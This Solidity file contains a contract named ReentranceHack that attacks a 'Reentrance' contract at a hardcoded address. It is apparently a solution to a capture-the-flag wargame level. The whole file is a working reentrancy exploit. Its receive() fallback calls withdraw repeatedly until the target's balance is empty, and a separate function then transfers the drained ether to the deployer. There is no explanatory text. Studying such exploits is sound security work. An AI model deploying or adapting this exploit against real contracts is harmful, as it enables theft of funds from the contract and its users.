// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrance {

    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint balance);

    function withdraw(uint _amount) external;

    receive() external payable;
}

contract ReentranceHack {

    address payable owner;
    address constant instanceAddress = 0xb83B02B02a80b2d600902E0839367192dBE6a5E1;
    Reentrance constant reentrance = Reentrance(payable(instanceAddress));

    constructor() {
        owner = payable(msg.sender);
    }

    function hack() public {
        uint256 balance = reentrance.balanceOf(address(this));
        require(balance > 0);

        reentrance.withdraw(1000000000000000);
    }

    function withdraw() public {
        owner.transfer(address(this).balance);
    }

    receive() external payable {
        if (instanceAddress.balance > 0) {
            reentrance.withdraw(1000000000000000);
        }
    }
}